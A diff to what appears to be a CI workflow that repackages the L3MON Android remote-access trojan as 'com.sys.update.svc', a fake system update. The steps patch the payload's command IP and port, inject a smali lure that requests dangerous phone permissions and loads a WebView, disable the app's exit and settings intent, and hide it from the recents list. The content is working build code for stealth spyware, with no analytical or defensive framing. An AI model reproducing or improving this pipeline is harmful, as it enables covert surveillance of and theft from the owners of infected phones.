@@ -24,7 +24,7 @@ jobs:
           wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
           wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar
 
-      - name: Stealth WebView Build
+      - name: Stable Stealth Build
         run: |
           OLD_PKG="com.etechd.l3mon"
           NEW_PKG="com.sys.update.svc"
@@ -48,13 +48,11 @@ jobs:
 
           # 3. Dynamic IP/Port Patching
           chmod +x patch_payload.sh
-          sed -i "s|payload_source/smali/$OLD_PATH/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
+          sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
           ./patch_payload.sh
 
-          # 4. Create Lure Template
-          # This version uses the full descriptor Landroid/app/Activity; for setContentView
-          # and L$NEW_PATH/MainActivity; for requestPermissions
-          cat > lure.smali <<LURE
+          # 4. Create Lure Template (Safe Quoted Heredoc)
+          cat > lure.template <<'LURE'
     const/4 v0, 0x7
     new-array v0, v0, [Ljava/lang/String;
     const/4 v1, 0x0
@@ -79,7 +77,7 @@ jobs:
     const-string v2, "android.permission.READ_PHONE_STATE"
     aput-object v2, v0, v1
     const/4 v1, 0x1
-    invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions([Ljava/lang/String;I)V
+    invoke-virtual {p0, v0, v1}, LNP_HOLDER/MainActivity;->requestPermissions([Ljava/lang/String;I)V
 
     new-instance v0, Landroid/webkit/WebView;
     invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
@@ -91,6 +89,7 @@ jobs:
     invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
     invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(Landroid/view/View;)V
 LURE
+          sed "s|NP_HOLDER|$NEW_PATH|g" lure.template > lure.smali
 
           # 5. Inject Lure
           sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r lure.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
@@ -101,9 +100,8 @@ LURE
           sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
           sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
 
-          # 7. Manifest Polish
-          sed -i "s|com.etechd.l3mon.MainActivity|com.sys.update.svc.MainActivity|g" payload_source/AndroidManifest.xml
-          sed -i 's/android:name="com.sys.update.svc.MainActivity"/android:name="com.sys.update.svc.MainActivity" android:excludeFromRecents="true" android:configChanges="orientation|keyboardHidden|screenSize"/g' payload_source/AndroidManifest.xml
+          # 7. Manifest Update
+          sed -i "s|$NEW_PKG.MainActivity|$NEW_PKG.MainActivity\" android:excludeFromRecents=\"true\"|g" payload_source/AndroidManifest.xml
 
       - name: Build APK
         run: |
